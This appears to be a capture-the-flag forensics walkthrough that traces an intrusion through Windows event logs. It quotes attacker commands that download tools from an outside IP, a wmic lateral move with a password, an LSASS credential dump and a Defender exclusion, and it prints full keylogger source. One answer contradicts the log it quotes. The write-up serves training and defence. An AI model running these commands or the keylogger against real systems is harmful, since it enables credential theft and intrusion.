+++
title = 'WACTF 2022 Incident Response'
date = '2022-06-22T03:29:00Z'
tags = ['forensics','beginner']
featured = false
+++

> [!CAUTION]
> This is a very old beginner-friendly walkthrough for a now dead CTF. It was written *years ago* so don't expect much.

## Intro

This covers the Incident-Response/Forensics section of WACTF 2022. Unfortunately I do not have the challenge files to hand, and couldn't find them in [the repo](https://github.com/WACTF-org/2022-prod) but you might have more luck. The challenge provided download for a number of event log files (`.evtx`) from multiple machines.

## Challenges

### Intro (`10pts`)

#### Description

How did the accounts user logon? Via the Console (Keyboard) or Via the Network (RDP / VPN etc?)

Answer is either `WACTF{CONSOLE}` or `WACTF{NETWORK}`

{{< details summary="Solution" >}}

From the log (found in the workstation’s `Security.evtx`):

``` text
Type : Audit Success
Date : 18/11/2022
Time : 9:18:21 AM
Event : 4634
Source : Microsoft-Windows-Security-Auditing
Category : Logoff
User : N/A
Computer : accounts10.slb.com
Description:
An account was logged off.

Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x57624f

Logon Type: 2
```

We can see the LogonType field for the accounts user’s session is 2, With a quick google search we can see that a logon type 2 is an interactive local logon, not a network logon, therefore:

**FLAG** `WACTF{CONSOLE}`

{{< /details >}}

### That doesn't look right... (`20pts`)

#### Description

What is the filename of the likely malware that is dropped on the Workstation computer initially?

Example: `WACTF{malware.exe}`

{{< details summary="Solution" >}}

From this log (found in the workstation’s `Security.evtx`):

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:22:48 AM
Event : 4688
Source : Microsoft-Windows-Security-Auditing
Category : Process Creation
User : N/A
Computer : accounts10.slb.com
Description:
A new process has been created.

Creator Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x2cc4e6

Target Subject:
  Security ID: S-1-0-0
  Account Name: -
  Account Domain: -
  Logon ID: 0x0

Process Information:
  New Process ID: 0x1bc8
  New Process Name: C:\Windows\System32\whoami.exe
  Token Elevation Type: TokenElevationTypeDefault (1)
  Mandatory Label: S-1-16-8192
  Creator Process ID: 0x41c
  Creator Process Name: C:\Users\accounts\Downloads\install.exe
  Process Command Line: whoami
```

We can see that a downloaded executable called install.exe running the command whoami, a common first step for an attacker once they gain access to a machine. This is not behaviour that would be seen from a true installer executable and therefore the flag is:

**FLAG** `WACTF{install.exe}`

{{< /details >}}

### How did that get there???!! (`20pts`)

#### Description

How did the malware get on the computer?

Options are:

- `WACTF{EMAIL}`
- `WACTF{BROWSER}`
- `WACTF{EXPLOIT}`
- `WACTF{INSIDER}`


{{< details summary="Solution" >}}

From this log (found in the workstation’s `Security.evtx`):

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:21:22 AM
Event : 4688
Source : Microsoft-Windows-Security-Auditing
Category : Process Creation
User : N/A
Computer : accounts10.slb.com
Description:
A new process has been created.

Creator Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x2cc4e6

Target Subject:
  Security ID: S-1-0-0
  Account Name: -
  Account Domain: -
  Logon ID: 0x0

Process Information:
  New Process ID: 0x41c
  New Process Name: C:\Users\accounts\Downloads\install.exe
  Token Elevation Type: TokenElevationTypeDefault (1)
  Mandatory Label: S-1-16-8192
  Creator Process ID: 0x1b50
  Creator Process Name: C:\Windows\System32\browser_broker.exe
  Process Command Line: "C:\Users\accounts\Downloads\install.exe"
```

We see the malware file we just found (`install.exe`) being run by `browser_broker.exe`. As the name suggests, this executable is used in browser function, therefore the flag is:

**FLAG** `WACTF{BROWSER}`

{{< /details >}}

### Running the playbook (`30pts`)

#### Description

What is the second enumeration command line the attacker runs?

{{< details summary="Solution" >}}

From this log (found in the workstation’s `Security.evtx`):

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:23:19 AM
Event : 4688
Source : Microsoft-Windows-Security-Auditing
Category : Process Creation
User : N/A
Computer : accounts10.slb.com
Description:
A new process has been created.

Creator Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x2cc4e6

Target Subject:
  Security ID: S-1-0-0
  Account Name: -
  Account Domain: -
  Logon ID: 0x0

Process Information:
  New Process ID: 0x16d4
  New Process Name: C:\Windows\System32\whoami.exe
  Token Elevation Type: TokenElevationTypeDefault (1)
  Mandatory Label: S-1-16-8192
  Creator Process ID: 0x41c
  Creator Process Name: C:\Users\accounts\Downloads\install.exe
  Process Command Line: whoami /group
```

We see the malware file we just found (`install.exe`) running a second enumeration command `whoami /group`, therefore the flag is:

**FLAG** `WACTF{whoami /group}`

{{< /details >}}

### Who hack? (`20pts`)

#### Description

What command line lets the attacker identify domain admin accounts?

*Note: there is an extraneous 1 appended to the executable name. Remove it before submitting the flag.*

{{< details summary="Solution" >}}

From this log (found in the workstation’s `Security.evtx`):

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:23:52 AM
Event : 4688
Source : Microsoft-Windows-Security-Auditing
Category : Process Creation
User : N/A
Computer : accounts10.slb.com
Description:
A new process has been created.

Creator Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x2cc4e6

Target Subject:
  Security ID: S-1-0-0
  Account Name: -
  Account Domain: -
  Logon ID: 0x0

Process Information:
  New Process ID: 0xee0
  New Process Name: C:\Windows\System32\net.exe
  Token Elevation Type: TokenElevationTypeDefault (1)
  Mandatory Label: S-1-16-8192
  Creator Process ID: 0x41c
  Creator Process Name: C:\Users\accounts\Downloads\install.exe
  Process Command Line: net group "domain admins" /domain
```

We see the malware file we just found (`install.exe`) running a new command `net group "domain admins" /domain` . With a quick google we can confirm that this command lets the attacker identify domain admin accounts and therefore the flag is:

**FLAG** `WACTF{net group "domain admins" /domain}`

{{< /details >}}

### Sophisticated Attacker!! (`20pts`)

What command line is used to identify weaknesses in the Workstations malware protection?

Example answer: `WACTF{cmd.exe /c find_malware_weakness.sh}`

{{< details summary="Solution" >}}

From this log (found in the workstation’s `Security.evtx`):

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:25:15 AM
Event : 4688
Source : Microsoft-Windows-Security-Auditing
Category : Process Creation
User : N/A
Computer : accounts10.slb.com
Description:
A new process has been created.

Creator Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x2cc4e6

Target Subject:
  Security ID: S-1-0-0
  Account Name: -
  Account Domain: -
  Logon ID: 0x0

Process Information:
  New Process ID: 0x18b0
  New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Token Elevation Type: TokenElevationTypeDefault (1)
  Mandatory Label: S-1-16-8192
  Creator Process ID: 0x41c
  Creator Process Name: C:\Users\accounts\Downloads\install.exe
  Process Command Line: powershell.exe Add-MpPreference -ExclusionPath C:temp
```

We see the attacker running the command `powershell.exe Get-MpPreference | Select-Object -Property ExclusionPath`. With a quick google we see that `Get-MpPreference` is a PowerShell module that checks and modifies options for windows defender, and the `Select-Object -Property ExclusionPath flags` request a list of windows defender exclusions, aka areas in the computer windows defender does not scan, and therefore areas where the attacker can operate without scrutiny. Therefore the flag is:

**FLAG** `WACTF{powershell.exe Get-MpPreference | Select-Object -Property ExclusionPath}`

{{< /details >}}

### VERY Sophisticated attacker (`10pts`)

#### Description

Is the command used to weaken the workstations malware protection successful?

Answer is one of:

- `WACTF{YES}`
- `WACTF{NO}`

{{< details summary="Solution" >}}

From this log (found in the workstation’s `Security.evtx`):

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:25:15 AM
Event : 4688
Source : Microsoft-Windows-Security-Auditing
Category : Process Creation
User : N/A
Computer : accounts10.slb.com
Description:
A new process has been created.

Creator Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x2cc4e6

Target Subject:
  Security ID: S-1-0-0
  Account Name: -
  Account Domain: -
  Logon ID: 0x0

Process Information:
  New Process ID: 0x18b0
  New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Token Elevation Type: TokenElevationTypeDefault (1)
  Mandatory Label: S-1-16-8192
  Creator Process ID: 0x41c
  Creator Process Name: C:\Users\accounts\Downloads\install.exe
  Process Command Line: powershell.exe Add-MpPreference -ExclusionPath C:temp
```

We see a new PowerShell session where the attackers try to add a new exclusion with the command `powershell.exe Add-MpPreference -ExclusionPath C:temp`.

This is a Process Creation log, and the PowerShell session has the process ID `0x18b0`. We can the look for the corresponding Process Termination log to see if the command ran successfully:

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:25:17 AM
Event : 4689
Source : Microsoft-Windows-Security-Auditing
Category : Process Termination
User : N/A
Computer : accounts10.slb.com
Description:
A process has exited.

Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x2cc4e6

Process Information:
  Process ID: 0x18b0
  Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Exit Status: 0x1
```

As we can see, the process exited with status `0x1`. A quick google can tell us that this means an error occurred and the command did not run successfully, therefore the flag is:

**FLAG** `WACTF{NO}`

{{< /details >}}

### Moaaar Tools!! (`30pts`)

#### Description

What is the url that the attacker downloads further tools from?

{{< details summary="Solution" >}}

From this log (found in the workstation’s `Security.evtx`):

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:26:17 AM
Event : 4688
Source : Microsoft-Windows-Security-Auditing
Category : Process Creation
User : N/A
Computer : accounts10.slb.com
Description:
A new process has been created.

Creator Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x2cc4e6

Target Subject:
  Security ID: S-1-0-0
  Account Name: -
  Account Domain: -
  Logon ID: 0x0

Process Information:
  New Process ID: 0x1b5c
  New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Token Elevation Type: TokenElevationTypeDefault (1)
  Mandatory Label: S-1-16-8192
  Creator Process ID: 0x41c
  Creator Process Name: C:\Users\accounts\Downloads\install.exe
  Process Command Line: powershell.exe -nop -w hidden -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADMAOQAuADYAMAAuADEANgAxAC4ANQA2ADoAOAAwADgAMAAvAHMAZQByAHYAaQBjAGUALgBiAGEAdAAgAC0ATwB1AHQARgBpAGwAZQAgAEMAOgBcAFQAZQBtAHAAXABzAGUAcgB2AGkAYwBlAC4AYgBhAHQACgA=
```

We see a new PowerShell session where the attackers run the encoded command `SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADMAOQAuADYAMAAuADEANgAxAC4ANQA2ADoAOAAwADgAMAAvAHMAZQByAHYAaQBjAGUALgBiAGEAdAAgAC0ATwB1AHQARgBpA`.

A quick google can tell us that this is Base64 encoding, and then we can use the online tool [CyberChef](https://gchq.github.io/CyberChef/) to decode the command, which is shown to be: `Invoke-WebRequest http://139.60.161.56:8080/service.bat -OutFile C:\Temp\service.bat`

As we can see, the attackers download a tool at the web address `http://139.60.161.56:8080/service.bat`, therefore the flag is:

**FLAG** `WACTF{http://139.60.161.56:8080/service.bat}`

{{< /details >}}

### APT Sophisticated!! (`20pts`)

#### Description

Is the attackers attempt to run this tool successful?

Answer is one of:

- `WACTF{YES}`
- `WACTF{NO}`

{{< details summary="Solution" >}}

From this log (found in the workstation’s `Security.evtx`):

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:27:42 AM
Event : 4688
Source : Microsoft-Windows-Security-Auditing
Category : Process Creation
User : N/A
Computer : accounts10.slb.com
Description:
A new process has been created.

Creator Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x2cc4e6

Target Subject:
  Security ID: S-1-0-0
  Account Name: -
  Account Domain: -
  Logon ID: 0x0

Process Information:
  New Process ID: 0x15b4
  New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Token Elevation Type: TokenElevationTypeDefault (1)
  Mandatory Label: S-1-16-8192
  Creator Process ID: 0x41c
  Creator Process Name: C:\Users\accounts\Downloads\install.exe
  Process Command Line: powershell.exe -nop -w hidden Start-Process services.bat -RedirectStandardOutput ‘.license.txt’ -RedirectStandardError ‘.error.txt’
```

We see a new PowerShell session where the attackers try to run the file `services.bat`. This is a Process Creation log, and the PowerShell session has the
process ID `0x15b4`. We can the look for the corresponding Process Termination log to see if the command ran successfully:

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:28:01 AM
Event : 4689
Source : Microsoft-Windows-Security-Auditing
Category : Process Termination
User : N/A
Computer : accounts10.slb.com
Description:
A process has exited.

Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x2cc4e6

Process Information:
  Process ID: 0x15b4
  Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Exit Status: 0x1
```

As we can see, the process exited with status `0x1`. A quick google can tell us that this means an error occurred and the command did not run successfully, therefore the flag is:

**FLAG** `WACTF{NO}`

{{< /details >}}

### What malz is that?? (`30pts`)

#### Description

What language (other than powershell) does the powershell tool log.ps1 use?

{{< details summary="Solution" >}}

From this log (found in the workstation’s `Windows PowerShell.evtx`):

```text
Type : Information
Date : 18/11/2022
Time : 9:28:52 AM
Event : 800
Source : PowerShell
Category : Pipeline Execution Details
User : N/A
Computer : accounts10.slb.com
Description:
Pipeline execution details for command line: Add-Type -TypeDefinition @"
.

Context Information:
  DetailSequence=1
  DetailTotal=1
  SequenceNumber=15
  UserId=SLB\accounts
  HostName=ConsoleHost
  HostVersion=5.0.10586.0
  HostId=ce87c37b-595a-46ea-bfd6-aad671f88af2
  HostApplication=powershell.exe -nop -w hidden -exec bypass c:/temp/log.ps1
  EngineVersion=5.0.10586.0
  RunspaceId=a60e0362-9d67-4d8b-92cd-9f80bace0205
  PipelineId=1
  ScriptName=C:\temp\log.ps1
  CommandLine=Add-Type -TypeDefinition @"

Details:
***CODE***
```

We see a new PowerShell session try to run the file `log.ps1`. This log also happens to contain the code of this file, which is:

```ps1
CommandInvocation(Add-Type): "Add-Type"
ParameterBinding(Add-Type): name="TypeDefinition"; value="using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;namespace KeyLogger {
public static class Program {
private const int WH_KEYBOARD_LL = 13;
private const int WM_KEYDOWN = 0x0100;private const string logFileName = "log.txt";
private static StreamWriter logFile;private static HookProc hookProc = HookCallback;
private static IntPtr hookId = IntPtr.Zero;
public static void Main() {
logFile = File.AppendText(logFileName);
logFile.AutoFlush = true;
hookId = SetHook(hookProc);
Application.Run();
UnhookWindowsHookEx(hookId);
}
private static IntPtr SetHook(HookProc hookProc) {
IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
}
private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
int vkCode = Marshal.ReadInt32(lParam);
logFile.WriteLine((Keys)vkCode);
}
return CallNextHookEx(hookId, nCode, wParam, lParam);
}
[DllImport("user32.dll")]
private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
[DllImport("user32.dll")]
private static extern bool UnhookWindowsHookEx(IntPtr hhk);
[DllImport("user32.dll")]
private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
[DllImport("kernel32.dll")]
private static extern IntPtr GetModuleHandle(string lpModuleName);
}
}"
ParameterBinding(Add-Type): name="ReferencedAssemblies"; value="System.Windows.Forms"
```

With a bit of googling (for instance googling the variable declarations such as `private static extern IntPtr` ), we can find that this file uses the language C#, therefore the flag is:

**FLAG** `WACTF{C#}`

{{< /details >}}

### Tekneeks (`30pts`)

What Mitre ATTACK technique (including sub technique number) does the log.ps1 tool use?

Response should be in the format: `WACTF{TXXXX.YYY}` (e.g. `WACTF{T1000.005}`)

{{< details summary="Solution" >}}

Reading through that code, we can see that it calling itself a KeyLogger, which is a type of malware. Goggling the phrase keylogger mitre attack brings us to it’s [MITRE att&ck page](https://attack.mitre.org/techniques/T1056/001/) which contains its technique and sub-technique number, and therefore the flag is:

**FLAG** `WACTF{T1056.001}`

{{< /details >}}

### hooking for apt victory!! (`40pts`)

#### Description

What function does log.ps1 hook to do its thing?

{{< details summary="Solution" >}}

Reading through the code of log.ps1 again, we come find the line

```c#
return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
```

which as the names of functions would imply, hooks the function `WH_KEYBOARD_LL`, therefore the flag is:

**FLAG** `WACTF{WH_KEYBOARD_LL}`

{{< /details >}}

### Mooooaaarr Tekneeeks (`40pts`)

#### Description

What is the mitre attack frameworks TTP number for the EXECUTION technique used to move laterally to the next target?

Answer Format: `WACTF{TXXXX}` where X is an integer (e.g. `WACTF{T1111}`)

{{< details summary="Solution" >}}

From this log (found in the workstation’s `Security.evtx`):

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:32:09 AM
Event : 4688
Source : Microsoft-Windows-Security-Auditing
Category : Process Creation
User : N/A
Computer : accounts10.slb.com
Description:
A new process has been created.

Creator Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x2cc4e6

Target Subject:
  Security ID: S-1-0-0
  Account Name: -
  Account Domain: -
  Logon ID: 0x0

Process Information:
  New Process ID: 0x1070
  New Process Name: C:\Windows\System32\wbem\WMIC.exe
  Token Elevation Type: TokenElevationTypeDefault (1)
  Mandatory Label: S-1-16-8192
  Creator Process ID: 0x41c
  Creator Process Name: C:\Users\accounts\Downloads\install.exe
  Process Command Line: wmic /user:administrator /password:P@ssw0rd /node:10.0.100.1 process call create "certutil.exe -urlcache -split -f http://139.60.161.56:8080/install.exe c:/temp/install.exe"
```

We see the attackers using the tool `wmic` to run commands on a new machine. googling the phrase wmic mitre attack brings us to the page for [Windows Management Instrumentation based attacks](https://attack.mitre.org/techniques/T1047/), giving us the mitre technique number. Therefore the flag is:

**FLAG** `WACTF{T1047}`

{{< /details >}}

### The best type of tool... (`30pts`)

#### Description

What tool (filename) does the actor use to download the implant onto DC01 ?

Response example: `WACTF{badfile.dll}`

{{< details summary="Solution" >}}

From the same log from the previous challenge (found in the workstation’s `Security.evtx`):

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:32:09 AM
Event : 4688
Source : Microsoft-Windows-Security-Auditing
Category : Process Creation
User : N/A
Computer : accounts10.slb.com
Description:
A new process has been created.

Creator Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-1602
  Account Name: accounts
  Account Domain: SLB
  Logon ID: 0x2cc4e6

Target Subject:
  Security ID: S-1-0-0
  Account Name: -
  Account Domain: -
  Logon ID: 0x0

Process Information:
  New Process ID: 0x1070
  New Process Name: C:\Windows\System32\wbem\WMIC.exe
  Token Elevation Type: TokenElevationTypeDefault (1)
  Mandatory Label: S-1-16-8192
  Creator Process ID: 0x41c
  Creator Process Name: C:\Users\accounts\Downloads\install.exe
  Process Command Line: wmic /user:administrator /password:P@ssw0rd /node:10.0.100.1 process call create "certutil.exe -urlcache -split -f http://139.60.161.56:8080

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled. A full token is only used if User Account Control is disabled or if the user is the built-in

Type 2 is an elevated token with no privileges removed or groups disabled. An elevated token is used when User Account Control is enabled and the user chooses to s

Type 3 is a limited token with administrative privileges removed and administrative groups disabled. The limited token is used when User Account Control is enabled
```

We see the attackers using the tool wmic to run the command `certutil.exe -urlcache -split -f http://139.60.161.56:8080/install.exe c:/temp/install.exe`. A quick google will confirm that certutil.exe is being used to download the malware install.exe, therefore the flag is:

**FLAG** `WACTF{certutil.exe}`

{{< /details >}}

### Did I mention sophisticated? (`30pts`)

#### Description

What is the common abbreviated name for a legitimate tool to that can be abused to perform / hide nefarious activities?

Provide flag in the form `WACTF{abbreviationhere}`

{{< details summary="Solution" >}}

The name for using legitimate and existing tools for an attack is called living off the land (as in the attackers are living off the land they find themselves on, not changing the environment and bringing in external tooling). The name for binaries that are used for this type of attack is living off the land binaries, often shortened to [LOLBins](https://www.securityhq.com/blog/security-101-lolbins-malware-exploitation/). Reading the challenge description closely, we see that we are looking for the name of a single tool, not all tools. Taking into account the plurality, the flag is:

**FLAG** `WACTF{LOLBin}`

{{< /details >}}

### Mightar (`40pts`)

#### Description

What is the mitre technique and sub technique number that the actor is trying to achieve with the rundll command they run?

Response format: `WACTF{TXXXX.YYY}` (e.g. `WACTF{T1111.222}`)

{{< details summary="Solution" >}}

From this log (found in the server’s Security.evtx ):

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:36:59 AM
Event : 4688
Source : Microsoft-Windows-Security-Auditing
Category : Process Creation
User : N/A
Computer : DC01.slb.com
Description:
A new process has been created.

Creator Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-500
  Account Name: Administrator
  Account Domain: SLB
  Logon ID: 0x830fbe

Target Subject:
  Security ID: S-1-0-0
  Account Name: -
  Account Domain: -
  Logon ID: 0x0

Process Information:
  New Process ID: 0x1144
  New Process Name: C:\Windows\System32\rundll32.exe
  Token Elevation Type: TokenElevationTypeDefault (1)
  Mandatory Label: S-1-16-12288
  Creator Process ID: 0xb38
  Creator Process Name: C:\Temp\install.exe
  Process Command Line: rundll32.exe comsvcs.dll MiniDump 676 raw.dat full
```

We see the attackers using tool rundll32 to run the command `rundll32.exe comsvcs.dll MiniDump 676 raw.dat full`. Googling the command rundll32.exe comsvcs.dll MiniDump brings us to this page titled [Dumping Lsass Without Mimikatz](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz). Now knowing that this command is meant to dump lsass memory, we can google dumping lsass mitre attack which will bring us to the page [OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/), giving us the mitre technique and sub- technique number. Therefore the flag is:

**FLAG** `WACTF{T1003.001}`

{{< /details >}}

### Still running the playbook.. (`30pts`)

#### Description

What commandline does the actor run to find all computers in the domain?

Answer format example: `WACTF{finall /computers -domain}`

{{< details summary="Solution" >}}

From this log (found in the server’s Security.evtx ):

```text
Type : Audit Success
Date : 18/11/2022
Time : 9:42:24 AM
Event : 4688
Source : Microsoft-Windows-Security-Auditing
Category : Process Creation
User : N/A
Computer : DC01.slb.com
Description:
A new process has been created.

Creator Subject:
  Security ID: S-1-5-21-446391854-2889301652-1122540466-500
  Account Name: Administrator
  Account Domain: SLB
  Logon ID: 0x830fbe

Target Subject:
  Security ID: S-1-0-0
  Account Name: -
  Account Domain: -
  Logon ID: 0x0

Process Information:
  New Process ID: 0x650
  New Process Name: C:\Windows\System32\dsquery.exe
  Token Elevation Type: TokenElevationTypeDefault (1)
  Mandatory Label: S-1-16-12288
  Creator Process ID: 0xb38
  Creator Process Name: C:\Temp\install.exe
  Process Command Line: dsquery * -filter (objectCategory=Computer)

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled. A full token is only used if User Account Control is disabled or if the user is the built-in

Type 2 is an elevated token with no privileges removed or groups disabled. An elevated token is used when User Account Control is enabled and the user chooses to s

Type 3 is a limited token with administrative privileges removed and administrative groups disabled. The limited token is used when User Account Control is enabled
```

We see the attackers running the command `dsquery * -filter (objectCategory=Computer)`. Googling the command confirms that this command will list all the computers in the domain. Therefore the flag is:

**FLAG** `WACTF{dsquery * -filter (objectCategory=Computer)}`

{{< /details >}}

### 2600 Tekneeks (`40pts`)

#### Description

What Mitre Attack Technique and sub technique is used to gain full control of the domain?

Answer Format: `WACTF{TXXXX.YYY}` (e.g. `WACTF{T2222.333}`)

{{< details summary="Solution" >}}

As we saw in question 16, the attackers dump lsass memory, reading up on what the actually means, it means that the attackers have dumped the passwords of accounts on this new machine. Since we see no other suspicious activity in the logs that would likely enable access to a new account, we can assume that this is how the domain was taken over. Therefore the flag is:

**FLAG** `WACTF{T1003.001}`


{{< /details >}}

### Deus Ex Machima / Everyones ransomware recovery plan (`80pts`)

The actor accidently leaves the following on the DarkWeb(tm):

```text
download raw.dat
ls
msf -L 91.208.52.149 -l 443
upload ../html/TrashMBR.exe
execute -o copy TrashMBR.exe //slb.com/SYSVOL/slb.com/scripts/TrashMBR.exe
tasks
```

What implant / C2 framework is the actor using (ie. what generated this log file)?

Answer Format: `WACTF{name}` (e.g. `WACTF{BO2k}`)

{{< details summary="Solution" >}}

Reading through these logs, and searching up the commands used ( execute -o, tasks, etc) you will find that they don’t match most C2 systems, but matches one called Sliver (If by this point you have completed the attribution question Q22 then you can also double check that the group doing these activities does use sliver, which is confirmed by articles such as [this one](https://thehackernews.com/2022/08/cybercrime-groups-increasingly-adopting.html)). Therefore the flag is:

**FLAG** `WACTF{Sliver}`

{{< /details >}}

### Implant Inception (`50pts`)

#### Description

What is the second implant / C2 framework dropped from the original C2 framework on the DC? (use the miraculous log find in Q 19)

Example solution `WACTF{ANDRORAT}`

{{< details summary="Solution" >}}

As suggested in the challenge description, we should start by looking at the logs of question 19. With research or prior knowledge, you can recognise some of those commands to be those for a tool called meterpreter, which perfectly matches the tool described in the challenge description. Therefore the flag is:

**FLAG** `WACTF{Meterpreter}`

{{< /details >}}

### Final Countdown!! (`80pts`)

#### Description

What sort of tool is TrashMBR ?

eg. Ransomware, RAT, Worm etc. etc.

{{< details summary="Solution" >}}

From the name of the tool, we can assume it is meant to trash the MBR, whatever that is. Googling once again, we see that MBR stands for Master Boot Record, and that destroying this area on the disk is a common technique for only two types of malware, wiper viruses and ransomware as it effectively renders a computer useless. From the name, we can assume that all this tool does is render a computer useless, therefore it is a wiper virus not ransomware and thus the flag is:

**FLAG** `WACTF{Wiper}`

{{< /details >}}

### Attribution Bingo. (`50pts`)

#### Description

The CEO wants to know the name of the hacking group that did this?

{{< details summary="Solution" >}}

Googling the IP found in the miraculous logs from question 19, we find many articles (such as [this one](https://www.varonis.com/blog/hive-ransomware-analysis)) linking it to the operations of a specific threat actor: Hive ransomware group. Therefore the flag is:

**FLAG** `WACTF{Hive}`

{{< /details >}}
